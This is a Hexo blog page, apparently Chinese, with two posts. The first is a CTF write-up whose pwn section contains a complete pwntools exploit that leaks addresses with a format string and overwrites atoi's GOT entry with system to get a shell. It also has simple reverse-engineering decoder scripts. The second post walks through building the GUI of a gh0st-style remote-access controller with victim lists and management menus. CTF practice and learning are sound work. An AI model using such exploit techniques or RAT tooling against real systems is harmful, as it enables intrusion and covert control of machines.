<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-22.8.10xctf-pwn&amp;re" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/08/10/22.8.10xctf-pwn&re/" class="article-date">
  <time datetime="2022-08-10T03:21:19.705Z" itemprop="datePublished">2022-08-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="new-easypwn"><a href="#new-easypwn" class="headerlink" title="new-easypwn"></a>new-easypwn</h2><p>main函数里看见这个程序实现增删查改的功能</p>
<p><img src="https://s2.loli.net/2022/08/10/zWY4kwLGyF8ZI1s.png"></p>
<p>进入ad函数需要输入num,name ,xize ,des四个变量，发现这里的for循环多循环了一次，存在offbyone漏洞，但是不急，继续往下看。</p>
<p><img src="https://s2.loli.net/2022/08/10/yimk9VOAHBFqzaC.png"></p>
<p>进入md函数发现所有的输入都没有限制长度，而且des_addr就在name的后面不远。所以我们可以通过覆盖来修改des_addr,修改其为一个危险函数的地址，从而进行调用</p>
<p><img src="https://s2.loli.net/2022/08/10/tyXZ9NVB5h1jTRP.png"></p>
<p>我们发现在menu函数里，每次都循环调用了一个atoi，我们打算通过md溢出覆盖des_addr为atoi_addr,然后用md的read函数修改atoi的内部为system。</p>
<p>所以我们就需要泄露libc的基地址和程序载入的基地址</p>
<p><img src="https://s2.loli.net/2022/08/10/TgPvJUOAcIbhftN.png"></p>
<p>在刚进入程序时发现栈中已经存在了一些有偏移的程序地址和libc地址，我们直接利用格式化字符串将其泄露出来，并且计算处所需函数的地址</p>
<pre><code>newnote(&quot;%12$p%13$p&quot;,&quot;0&quot;,128, &quot;0&quot;*16)#0
shownote(0)

process__libc = p.recvuntil(&quot;name&quot;,drop=True)[-29:-1]
process_base = int(process__libc[:14].ljust(8,b&#39;\x00&#39;),16) - 0x12a0#__libc_csu_init
libc__libc_start_main_off = libc.symbols[&quot;__libc_start_main&quot;]
leak = libc_base = int(process__libc[14:].ljust(8,b&#39;\x00&#39;),16)
libc_base = int(process__libc[14:].ljust(8,b&#39;\x00&#39;),16) - libc__libc_start_main_off - 240

print(&#39;leak:&#39;,hex(leak))
print(&#39;process_base:&#39;,hex(process_base))
print(&#39;libc_base:&#39;,hex(libc_base))


system = libc_base + libc.sym[&#39;system&#39;]
print(&#39;system:&#39;,hex(system))
atoi_got = hello.got[&#39;atoi&#39;]+process_base
print(&#39;atoi_got:&#39;,hex(atoi_got))</code></pre>
<p><img src="https://s2.loli.net/2022/08/10/om8Ff6yj2piP4D1.png"></p>
<p>然后通过溢出修改des_info_addr为atoi_addr,并且修改atoi内部为system</p>
<pre><code>overwrite_name_payload = b&quot;a&quot;*13 + p64(atoi_got)

editnote(0, &#39;0&#39;,overwrite_name_payload,p64(system)) #id,num,name,des

p.recvuntil(&#39;your choice&gt;&gt;&#39;)
p.sendline(&#39;/bin/sh&#39;)</code></pre>
<p><img src="https://s2.loli.net/2022/08/10/OPsYg6dQRyXqznv.png"></p>
<p>最后发送/bin/sh即可getshell</p>
<pre><code>#! /usr/bin/python3
from pwn import *
elf = ELF(&#39;./hello&#39;)
p = process(&#39;./hello&#39;)
#p = remote(&quot;61.147.171.105&quot;,53706)
hello = ELF(&#39;./hello&#39;)
#libc = ELF(&#39;./libc-2.23.so&#39;)
libc = elf.libc
# libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
context.log_level = &#39;debug&#39;
#context.terminal = [&#39;tmux&#39;,&#39;sp&#39;,&#39;-h&#39;]


def newnote(number, name,size,des):
    p.recvuntil(&#39;your choice&gt;&gt;&#39;)
    p.sendline(&#39;1&#39;)
    p.recvuntil(&#39;phone number:&#39;)
    p.sendline(number)
    p.recvuntil(&#39;name:&#39;)
    p.sendline(name)
    p.recvuntil(&#39;size:&#39;)
    p.sendline(str(size))
    p.recvuntil(&#39;des info:&#39;)
    p.sendline(des)

def shownote(id):
    p.recvuntil(&#39;your choice&gt;&gt;&#39;)
    p.sendline(&#39;3&#39;)
    p.recvuntil(&#39;index:&#39;)
    p.sendline(str(id))

def editnote(id,num,name,des):
    p.recvuntil(&#39;your choice&gt;&gt;&#39;)
    p.sendline(&#39;4&#39;)
    p.recvuntil(&#39;index:&#39;)
    p.sendline(str(id))
    p.recvuntil(&#39;number:&#39;)
    p.sendline(num)
    p.recvuntil(&#39;name:&#39;)
    p.sendline(name)
    p.recvuntil(&#39;des info:&#39;)
    p.sendline(des)

def deletenote(id):
    p.recvuntil(&#39;your choice&gt;&gt;&#39;)
    p.sendline(&#39;2&#39;)
    p.recvuntil(&#39;index:&#39;)
    p.sendline(str(id))
gdb.attach(p)
#pause()# debug  0x2020A0
# leak process base libc base
newnote(&quot;%12$p%13$p&quot;,&quot;0&quot;,128, &quot;0&quot;*16)#0
shownote(0)

process__libc = p.recvuntil(&quot;name&quot;,drop=True)[-29:-1]
process_base = int(process__libc[:14].ljust(8,b&#39;\x00&#39;),16) - 0x12a0#__libc_csu_init
libc__libc_start_main_off = libc.symbols[&quot;__libc_start_main&quot;]
leak = libc_base = int(process__libc[14:].ljust(8,b&#39;\x00&#39;),16)
libc_base = int(process__libc[14:].ljust(8,b&#39;\x00&#39;),16) - libc__libc_start_main_off - 240

print(&#39;leak:&#39;,hex(leak))
print(&#39;process_base:&#39;,hex(process_base))
print(&#39;libc_base:&#39;,hex(libc_base))


system = libc_base + libc.sym[&#39;system&#39;]
print(&#39;system:&#39;,hex(system))
atoi_got = hello.got[&#39;atoi&#39;]+process_base
print(&#39;atoi_got:&#39;,hex(atoi_got))


overwrite_name_payload = b&quot;a&quot;*13 + p64(atoi_got)

editnote(0, &#39;0&#39;,overwrite_name_payload,p64(system)) #id,num,name,des

p.recvuntil(&#39;your choice&gt;&gt;&#39;)
p.sendline(&#39;/bin/sh&#39;)
p.interactive()

p.interactive()</code></pre>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="666"><a href="#666" class="headerlink" title="666"></a>666</h2><p>直接进入encode函数发现是个异或，我们只需要再异或一次就可以完成解密了</p>
<p><img src="https://s2.loli.net/2022/08/10/LHAVlZrd57weuEz.png"></p>
<p>利用脚本跑出结果</p>
<p>ord ： 取ascii码<br>append : 列表末尾添加元素</p>
<pre><code>enflag = &#39;izwhroz&quot;&quot;w&quot;v.K&quot;.Ni&#39;
key = 0x12
v = []
flag = []
for i in range (0,key , 3):
   a = (ord(enflag[i]) ^ key) -6
   b = (ord(enflag[i+1]) ^ key)  +6
   c = ord(enflag[i+2]) ^ 6 ^ key
   v.append(a)
   v.append(b)
   v.append(c)

for i in v :
    flag += chr(i)



print(flag)</code></pre>
<h2 id="流浪者"><a href="#流浪者" class="headerlink" title="流浪者"></a>流浪者</h2><p>根据字符串找到函数验证密码的位置，分析程序可以发现程序逻辑，exp如下：</p>
<pre><code>#include &lt;iostream&gt;
using namespace std;
int main()
&#123;
    char password[] = &#123; &quot;KanXueCTF2019JustForhappy&quot; &#125;;
    char key[] = &#123; &quot;abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ&quot; &#125;;

    //cout &lt;&lt; sizeof(password) &lt;&lt; endl;
    for (int i = 0; i &lt; sizeof(password); i++)
    &#123;
        for (int j = 0; j &lt; sizeof(key); j++)
        &#123;
            if (key[j] == password[i])
            &#123;
                printf(&quot;%d &quot;, j);

            &#125;
        &#125;
    &#125;

    int pw[] = &#123; 19, 0, 27 ,59, 44, 4, 11, 55, 14, 30, 28, 29, 37, 18, 44, 42, 43, 14, 38, 41, 7, 0 ,39 ,39 ,48, 62 &#125;;
    int pw2[sizeof(pw)] = &#123;0&#125;;
    char str[50] = &#123;0&#125;;
    //57-48 = 9    字符
    //97-87 = 10       122-87 = 35   
    //65-29 = 36        90-29 = 61   

    int v5[] = &#123; 19, 0, 27 ,59, 44, 4, 11, 55, 14, 30, 28, 29, 37, 18, 44, 42, 43, 14, 38, 41, 7, 0 ,39 ,39 ,48, 62 &#125;;
    char Str[sizeof(v5)/4] = &quot;&quot;;
    cout &lt;&lt; sizeof(v5) / 4 &lt;&lt; endl;

    for (int i = 0; i &lt; sizeof(v5)/4; ++i)
    &#123;
        if (v5[i] + 48 &gt; 57 || v5[i] + 48 &lt; 48)           // 非数字
        &#123;
            if (v5[i] + 87 &gt; 122 || v5[i] + 87 &lt; 97)        // 非小写字母
            &#123;
                if (v5[i] + 29 &gt; 90 || v5[i] + 29 &lt; 65)       // 非大写字母
                    //Str[i] = v5[i] + 29;
                    ;
                else
                    Str[i] = v5[i] + 29;                  // 大写
            &#125;
            else
            &#123;
                Str[i] = v5[i] + 87;                    // 小写
            &#125;
        &#125;
        else
        &#123;
            Str[i]= v5[i] + 48;                      // 是数字
        &#125;
    &#125;
    for (int i = 0; i &lt;sizeof(v5)/4; i++)
    &#123;
        printf(&quot;%c&quot;, Str[i]);
    &#125;
    return 0;
&#125;</code></pre>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/08/10/22.8.10xctf-pwn&re/" data-id="cl8plpiab0000g8v82tc8h8ni" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-远控ghost" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/04/07/%E8%BF%9C%E6%8E%A7ghost/" class="article-date">
  <time datetime="2022-04-07T14:32:37.280Z" itemprop="datePublished">2022-04-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/04/07/%E8%BF%9C%E6%8E%A7ghost/">记第一个GitHub项目 --ghost远控</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="客户端界面的设计和编写"><a href="#客户端界面的设计和编写" class="headerlink" title="客户端界面的设计和编写"></a>客户端界面的设计和编写</h1><h2 id="1-1-创建窗口"><a href="#1-1-创建窗口" class="headerlink" title="1.1 创建窗口"></a>1.1 创建窗口</h2><p>1.新建一个工程，看操作  我们必须给工程起一个响亮的名字 :-D  就叫CMDghost吧</p>
<p>2.添加最大化窗口，最小化窗口的属性</p>
<p><img src="https://s2.loli.net/2022/04/07/DnJm8vQgNZKYwEu.png"></p>
<p>3.更改对话框到适当大小</p>
<p>4.添加服务端连接后显示的列表控件IDC_ONLINE，日志列表控件IDC_MESSAGE</p>
<p><img src="https://s2.loli.net/2022/04/07/BPiQouJmckgXetz.png"></p>
<p><img src="https://s2.loli.net/2022/04/07/otevpd6LEPWZCAq.png"></p>
<p>6.添加列表控件变量m_CList_Online,m_CList_Message</p>
<p><img src="https://s2.loli.net/2022/04/07/yJrF3RAUYCI6E2V.png"></p>
<p>7.相应对话框改变大小的消息WM_SIZE就是 向对话框抛出这个消息对话框就会改变大小，我们先相应这个消息，然后再把这个消息<br>  向下传递</p>
<p><img src="https://s2.loli.net/2022/04/07/mfPWCXMGOxEuaSd.png"></p>
<p>9.示范伸缩</p>
<p>10.伸缩同原来的有差别，介绍一个小技巧 在OnInitDialog:</p>
<p>当对话框改变时，WM_SIZE抛出消息由OnInitDialog响应，此时对话框还没有显示，可以在显示前改变对话框。</p>
<p><img src="https://s2.loli.net/2022/04/07/M8VW2OGDicPuR5s.png"></p>
<h2 id="1-2-添加列表中的列名"><a href="#1-2-添加列表中的列名" class="headerlink" title="1.2 添加列表中的列名"></a>1.2 添加列表中的列名</h2><p>1.参考gh0st的列表中的列名:<br>   0IP 1所在区域   2计算机名/备注  3操作系统  4CPU  5摄像头  6Ping</p>
<p>2.上一节我们为列表控件添加变量，我们来查看变量的类型:<br>  CListCtrl 类 查看MSDN  找到</p>
<pre><code>int InsertColumn(
                int nCol,                  //列的顺序
                LPCTSTR lpszColumnHeading, //列的名字
                int nFormat = LVCFMT_LEFT,  //列对齐的方式 LVCFMT_LEFT, LVCFMT_RIGHT,LVCFMT_CENTER
                int nWidth = -1,            //列的宽度
                int nSubItem = -1           //与之联系的子条目 默认为-1 我们不用写
                );</code></pre>
<p>3.有了这些我们可以现在就写入代码了，但请等一下我们来考虑一下以后的扩展问题，假如我们要加入新的列那会不会很麻烦，我们每一个列都写入了固定的</p>
<p>  顺序(0–6)没有考虑扩展，比如在CPU列的后面加入显示内存大小，那么加入的就是第5列，而第5列恰好是摄头，这样显示的数据就会混乱(其实这个正是我写</p>
<p>   PCRat时犯的错误)，解决这个问题的方式就是用枚举enum 写入列的顺序时不写入硬编码(0—-6)而是写入枚举成员这样我们只需很小的改动就能达到目的。</p>
<p>4.需要一个列表记录表格中的字符，因为这个列表比较重要所以要放到一个每一个文件都能访问到的文件，我这里选择了framework.h</p>
<pre><code>enum
&#123;
    ONLINELIST_IP=0,          //IP的列顺序
    ONLINELIST_ADDR,          //地址
    ONLINELIST_COMPUTER_NAME, //计算机名/备注
    ONLINELIST_OS,           //操作系统
    ONLINELIST_CPU,          //CPU
    ONLINELIST_VIDEO,       //摄像头
    ONLINELIST_PING          //PING
&#125;;</code></pre>
<p><img src="https://s2.loli.net/2022/04/07/oIXgDbcBy2khKYf.png"></p>
<p>5.处理列表的代码应该统一放在一处，添加列表处理的代码InitList()</p>
<p>虽然列表可以直接写在OnInitDialog，但直接在这里初始化太过臃肿，所以可以添加成员函数</p>
<p><img src="https://s2.loli.net/2022/04/07/QImhWR61zrlBkMC.png"></p>
<p><img src="https://s2.loli.net/2022/04/07/UuWYy42olTQXPiM.png"></p>
<p>6.写入加入列表列名的代码:</p>
<p>   列表的名字与列表的宽度是同一一对应的关系，以后为了以后修改方便建立这样的一个结构体:</p>
<pre><code> typedef struct
&#123;
    char    *title;           //列表的名称
    int        nWidth;   //列表的宽度
&#125;COLUMNSTRUCT;</code></pre>
<p>以char类型表示 列表的名字，以int 类型表示列表的宽度</p>
<p>然后建立这个结构体变量的数组</p>
<pre><code>   COLUMNSTRUCT g_Column_Data[] = 
&#123;
    &#123;&quot;IP&quot;,                148    &#125;,
    &#123;&quot;区域&quot;,            150    &#125;,
    &#123;&quot;计算机名/备注&quot;,    160    &#125;,
    &#123;&quot;操作系统&quot;,        128    &#125;,
    &#123;&quot;CPU&quot;,                80    &#125;,
    &#123;&quot;摄像头&quot;,            81    &#125;,
    &#123;&quot;PING&quot;,            81    &#125;
&#125;;</code></pre>
<p>添加全局变量int g_Column_Count=7; //列表的个数</p>
<p><img src="https://s2.loli.net/2022/04/07/fNjlEcgLYiHpx56.png"></p>
<p>7.在initList中写入加入列表列名称的代码并解释:</p>
<pre><code> for (int i = 0; i &lt; g_Column_Count; i++)
&#123;
    m_CList_Online.InsertColumn(i, g_Column_Data[i].title,g_Column_Data[i].nWidth);
&#125;</code></pre>
<p><img src="https://s2.loli.net/2022/04/08/3h2bHCqJBLTdQY9.png"></p>
<p>我这里会报错，是因为使用了uncode字符集，需要修改为使用多字节字符集</p>
<p><img src="https://s2.loli.net/2022/04/08/WkTnhIuSazoYs6Z.png"></p>
<p><img src="https://s2.loli.net/2022/04/08/YZQOUBiDc8HqvWf.png"></p>
<pre><code>int InsertColumn(
                int nCol,                  //列的顺序
                LPCTSTR lpszColumnHeading, //列的名字
                int nFormat = LVCFMT_LEFT,  //列对齐的方式 LVCFMT_LEFT, LVCFMT_RIGHT,LVCFMT_CENTER
                int nWidth = -1,            //列的宽度
                int nSubItem = -1           //与之联系的子条目 默认为-1 我们不用写
                );</code></pre>
<p>再看一下InsertColumn ，传入的参数分别是顺序，名字，对齐方式 ，宽度</p>
<p>8.在OnInitDialog中写入InitList()</p>
<p><img src="https://s2.loli.net/2022/04/08/GsYkU6KASh8MiOQ.png"></p>
<p>9.改变列表控件的属性 ICon  改为Report</p>
<p><img src="https://s2.loli.net/2022/04/08/31zbUCPuqNsEglw.png"></p>
<p>10.同样的方法改动日志消息的列表控件看操作</p>
<pre><code>  //变量声明
   int g_Column_Count_Online=7; //列表的个数

COLUMNSTRUCT g_Column_Data_Message[] = 
&#123;
    &#123;&quot;信息类型&quot;,        68    &#125;,
    &#123;&quot;时间&quot;,            100    &#125;,
    &#123;&quot;信息内容&quot;,        660    &#125;
&#125;;


//InitList

for (int i = 0; i &lt; g_Column_Message; i++)
    &#123;
        m_CList_Message.InsertColumn(i, g_Column_Data_Message[i].title,LVCFMT_CENTER,g_Column_Data_Message[i].nWidth);
    &#125;</code></pre>
<p>11.改变列表控件的属性 ICon  改为Report</p>
<h2 id="1-3-列表的列宽度支持伸缩"><a href="#1-3-列表的列宽度支持伸缩" class="headerlink" title="1.3 列表的列宽度支持伸缩"></a>1.3 列表的列宽度支持伸缩</h2><p>1.CListCtrl  SetColumnWidth   查看MSDN<br>             BOOL SetColumnWidth(<br>                             int nCol,             //列索引<br>                             int cx                //列宽度<br>             );</p>
<p>2.声明列的总宽度:</p>
<pre><code>        int g_Column_Online_Width=0;  //列总宽度</code></pre>
<p><img src="https://s2.loli.net/2022/04/08/HCIDbnodrX81jMx.png"></p>
<p>3.得到列的总宽度 initlist中:</p>
<pre><code>       g_Column_Online_Width+=g_Column_Online_Data[i].nWidth;       //得到总宽度</code></pre>
<p><img src="https://s2.loli.net/2022/04/08/H8MpOYorKimk2jt.png"></p>
<p>4.在OnSize 添加代码:</p>
<pre><code>      double dcx=cx;     //对话框的总宽度

      for(int i=0;i&lt;g_Column_Online_Count;i++)&#123;                   //遍历每一个列
        double dd=g_Column_Online_Data[i].nWidth;     //得到当前列的宽度
        dd/=g_Column_Online_Width;                    //看一看当前宽度占总长度的几分之几
        dd*=dcx;                                       //用原来的长度乘以所占的几分之几得到当前的宽度
        int lenth=dd;                                   //转换为int 类型
        m_CList_Online.SetColumnWidth(i,(lenth));        //设置当前的宽度
    &#125;</code></pre>
<p><img src="https://s2.loli.net/2022/04/08/EP1k6xIysCfbm8K.png"></p>
<p>5.解释为什么用double</p>
<pre><code>          double   0.1        int 0 
            90.23232</code></pre>
<p>6.改变日志的列表宽度(与之前相同)</p>
<pre><code>  (1)int g_Column_Message_Width = 0;  //列总宽度
   (2)g_Column_Message_Width += g_Column_Data_Message[i].nWidth;       //得到总宽度


   for (int i = 0;i &lt; g_Column_Message;i++) &#123;                   //遍历每一个列
            double dd = g_Column_Data_Message[i].nWidth;     //得到当前列的宽度
            dd /= g_Column_Message_Width;                    //看一看当前宽度占总长度的几分之几
            dd *= dcx;                                       //用原来的长度乘以所占的几分之几得到当前的宽度
            int lenth = dd;                                   //转换为int 类型
            m_CList_Message.SetColumnWidth(i, (lenth));        //设置当前的宽度
        &#125;</code></pre>
<h2 id="1-4-列表中添加条目"><a href="#1-4-列表中添加条目" class="headerlink" title="1.4 列表中添加条目"></a>1.4 列表中添加条目</h2><p>1.CListCtrl    </p>
<pre><code>           InsertItem  插入条目
           int InsertItem(
                     int nItem,              //插入哪一行
                     LPCTSTR lpszItem        //该行0列显示的字符
           );

          SetItemText         设置哪个列的字符
          BOOL SetItemText(
                      int nItem,                   //改动那个行
                      int nSubItem,                //该行中那个子列
                      LPCTSTR lpszText             //要设置的字符
          );</code></pre>
<p>2.列表设计思路:</p>
<pre><code>         (1)服务端上线后要显示在列表中，这样有一个统一的函数来处理会使代码更加简洁。

         (2)消息显示分为成功失败两种，还要在其中显示消息产生的时间，这样也应该有一个统一的函数来处理。</code></pre>
<p>3.上线列表添加处理:</p>
<pre><code>void CPCRemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing)
&#123;
    m_CList_Online.InsertItem(0,strIP);           //默认为0行  这样所有插入的新列都在最上面
    m_CList_Online.SetItemText(0,ONLINELIST_ADDR,strAddr);      //设置列的显示字符   这里 ONLINELIST_ADDR等 为第二节课中的枚举类型 用这样的方法
    m_CList_Online.SetItemText(0,ONLINELIST_COMPUTER_NAME,strPCName); //解决问题会避免以后扩展时的冲突
    m_CList_Online.SetItemText(0,ONLINELIST_OS,strOS); 
    m_CList_Online.SetItemText(0,ONLINELIST_CPU,strCPU);
    m_CList_Online.SetItemText(0,ONLINELIST_VIDEO,strVideo);
    m_CList_Online.SetItemText(0,ONLINELIST_PING,strPing); 
&#125;</code></pre>
<p>在类视图CMFghostDlg中添加函数AddList ，并设置参数</p>
<p><img src="https://s2.loli.net/2022/04/09/iEhekLbNM5ZuAYg.png"></p>
<p>在资源管理器CMFCghostDlg中的AddList设置函数体</p>
<p><img src="https://s2.loli.net/2022/04/09/iQPMCouB1mKV53l.png"></p>
<p>4.添加日志消息的处理:</p>
<pre><code>// show msg 
void CPCRemoteDlg::ShowMessage(bool bIsOK, CString strMsg)
&#123;
    CString strIsOK,strTime;
    CTime t=CTime::GetCurrentTime();
    strTime=t.Format(&quot;%H:%M:%S&quot;);
    if (bIsOK)
    &#123;
        strIsOK=&quot;执行成功&quot;;
    &#125;else&#123;
        strIsOK=&quot;执行失败&quot;;
    &#125;
     m_CList_Message.InsertItem(0,strIsOK);
     m_CList_Message.SetItemText(0,1,strTime);
     m_CList_Message.SetItemText(0,2,strMsg);
&#125;</code></pre>
<p>在类视图CMFghostDlg中添加函数ShowMessage ，并设置参数</p>
<p><img src="https://s2.loli.net/2022/04/09/UL7KifCmHzEW681.png"></p>
<p>在资源管理器CMFCghostDlg中的ShowMessage设置函数体</p>
<p><img src="https://s2.loli.net/2022/04/09/dXDowiTUIMcug2L.png"></p>
<p>5.添加伪上线，和日志的测试代码,在没有加入gh0st传输内核之前是要自己测试的，所以要加入一个用于测试的函数:</p>
<pre><code>void CPCRemoteDlg::Test(void)
&#123;
    AddList(&quot;192.168.0.1&quot;,&quot;本机局域网&quot;,&quot;Lang&quot;,&quot;Windows7&quot;,&quot;2.2GHZ&quot;,&quot;有&quot;,&quot;123232&quot;);
    ShowMessage(true,&quot;软件初始化成功...&quot;);
&#125;</code></pre>
<p><img src="https://s2.loli.net/2022/04/09/sLc6w5Xjr8PIM9N.png"></p>
<p>  然后在OnInitDialog  中添加:</p>
<pre><code>Test();</code></pre>
<p><img src="https://s2.loli.net/2022/04/09/AwPYzoeFSOEL4im.png"></p>
<p>6.点击时整个列都是选中状态</p>
<pre><code> InitList():中加入代码:
   m_CList_Online.SetExtendedStyle(LVS_EX_FULLROWSELECT);

   m_CList_Message.SetExtendedStyle(LVS_EX_FULLROWSELECT);</code></pre>
<p><img src="https://s2.loli.net/2022/04/09/TSfY6GxaLEzcKq9.png"></p>
<h2 id="1-5-列表中显示弹出菜单"><a href="#1-5-列表中显示弹出菜单" class="headerlink" title="1.5 列表中显示弹出菜单"></a>1.5 列表中显示弹出菜单</h2><p>在资源视图中选择添加资源 menu </p>
<p><img src="https://s2.loli.net/2022/04/09/bBfFzMtqKHZgx2w.png"></p>
<p>在该menu视图中编辑内容</p>
<p><img src="https://s2.loli.net/2022/04/09/7VF6xWbmiozn4a3.png"></p>
<p>添加响应函数</p>
<p>在类视图中点击MFCghostDlg,选择属性，在IDC_ONLINE中设置NM_RCLICK事件.这样点击后就可触发响应函数中的代码。</p>
<p><img src="https://s2.loli.net/2022/04/09/qkui1hzbd9arpwN.png"></p>
<p><img src="https://s2.loli.net/2022/04/09/AgI3TkaDYw4UEMo.png"></p>
<p>填充函数</p>
<p><img src="https://s2.loli.net/2022/04/09/2OlUzuJhg5KIM6Y.png"></p>
<p><img src="https://s2.loli.net/2022/04/09/pBXv194uzrcRNkH.png"></p>
<pre><code>CMenu    popup;     //申明菜单变量
popup.LoadMenu(IDR_MENU_ONLINE);  //加载菜单项
CMenu* pM = popup.GetSubMenu(0);  //得到菜单项
CPoint    p;                       
GetCursorPos(&amp;p);             //得到鼠标位置
int    count = pM-&gt;GetMenuItemCount();     //得到菜单项的个数
if (m_CList_Online.GetSelectedCount() == 0)       //如果没有选中
&#123;
    for (int i = 0; i &lt; count; i++)
    &#123;
        pM-&gt;EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);          //菜单全部变灰
    &#125;

&#125;
pM-&gt;TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);    //显示菜单项
*pResult = 0;</code></pre>
<p>这样点击右键就可以看到列表了</p>
<p><img src="https://s2.loli.net/2022/04/09/pXR4Fub5iZPMglh.jpg"></p>
<h2 id="1-6-添加菜单消息响应，从列表中删除条目"><a href="#1-6-添加菜单消息响应，从列表中删除条目" class="headerlink" title="1.6 添加菜单消息响应，从列表中删除条目"></a>1.6 添加菜单消息响应，从列表中删除条目</h2><p>1.添加菜单消息响应的函数:</p>
<pre><code>     终端管理     进程管理    窗口管理    桌面管理     文件管理    语音管理     视频管理   服务管理     注册表管理</code></pre>
<p><img src="https://s2.loli.net/2022/04/12/2aQ9DxgmqnYR5Wp.png"></p>
<p>2.删除列表中的条目:</p>
<pre><code>  CListCtrl       (1)DeleteItem
                BOOL DeleteItem(
                             int nItem              //列表的索引  从0开始
               );
                 (2)GetSelectionMark
                   int GetSelectionMark( );        //得到用户选中的条目索引</code></pre>
<p>3.添加下线菜单  断开连接   ID:   IDM_ONLINE_DELETE</p>
<p><img src="https://s2.loli.net/2022/04/12/prwSgQVt5zUBoyq.png"></p>
<p>4.添加菜单响应消息，添加代码:</p>
<pre><code>                 int iSelect=m_CList_Online.GetSelectionMark( );
                         m_CList_Online.DeleteItem(iSelect);</code></pre>
<p><img src="https://s2.loli.net/2022/04/12/E6nAFVB5mCzYoc9.png"></p>
<p>5.产生下线日志: </p>
<pre><code>         CListCtrl     GetItemText 
                       CString GetItemText(
                                         int nItem,          //哪一行
                                         int nSubItem        //行中的那个子列
                       ) const;</code></pre>
<p>6.接着添加代码:</p>
<pre><code>CString strIP;
int iSelect=m_CList_Online.GetSelectionMark( );
strIP=m_CList_Online.GetItemText(iSelect,ONLINELIST_IP);
m_CList_Online.DeleteItem(iSelect);
strIP+=&quot;断开连接&quot;;
ShowMessage(true,strIP);</code></pre>
<p><img src="https://s2.loli.net/2022/04/12/E6nAFVB5mCzYoc9.png"></p>
<h2 id="1-7-为对话框添加菜单栏并添加事件响应"><a href="#1-7-为对话框添加菜单栏并添加事件响应" class="headerlink" title="1.7 为对话框添加菜单栏并添加事件响应"></a>1.7 为对话框添加菜单栏并添加事件响应</h2><p>1.创建菜单的资源  ID:  IDR_MENU_MAIN</p>
<p>2.添加菜单: </p>
<pre><code>        文件--退出(IDM_MAIN_CLOSE)
        设置--参数设置(IDM_MAIN_SET)----生成服务端(IDM_MAIN_BUILD)
        帮助--关于(IDM_MAIN_ABOUT)</code></pre>
<p><img src="https://s2.loli.net/2022/04/12/B3Obu9kWsejZVXJ.png"></p>
<p>3.为对话框添加代码,显示菜单:</p>
<pre><code>   (1) 认识几个API函数:
          HMENU LoadMenu(                    //载入菜单 
              HINSTANCE hInstance,          //资源所在文件模块的句柄标识
               LPCTSTR lpMenuName           //资源ID
           );
            BOOL SetMenu(                  //为窗口设置菜单
              HWND hWnd,                 //要设置菜单的窗口句柄
              HMENU hMenu                //菜单标识
            );
           BOOL DrawMenuBar(          //显示菜单
                   HWND hWnd          //要显示菜单的窗口句柄
            );

  (2)添加添加菜单的代码  oninitdialog


HMENU hmenu;
hmenu=LoadMenu(NULL,MAKEINTRESOURCE(IDR_MENU_MAIN));  //载入菜单资源
::SetMenu(this-&gt;GetSafeHwnd(),hmenu);                  //为窗口设置菜单
::DrawMenuBar(this-&gt;GetSafeHwnd());                    //显示菜单</code></pre>
<p><img src="https://s2.loli.net/2022/04/12/bdOMu6CvSpmxarH.png"></p>
<p>3.为每一个菜单添加事件响应</p>
<p>4.添加代码:</p>
<pre><code>  退出菜单代码:
         BOOL PostMessage(          HWND hWnd,             //标识向那个窗口发送消息
                                    UINT Msg,              //消息内容
                                    WPARAM wParam,         //消息参数
                                     LPARAM lParam          //消息参数
        );

         PostMessage(WM_CLOSE,0,0);

 关于菜单代码:
       CAboutDlg dlgAbout;
       dlgAbout.DoModal();
其他代码用MessageBox代替</code></pre>
<p><img src="https://s2.loli.net/2022/04/12/mk4VcpKFatSOPAT.png"></p>
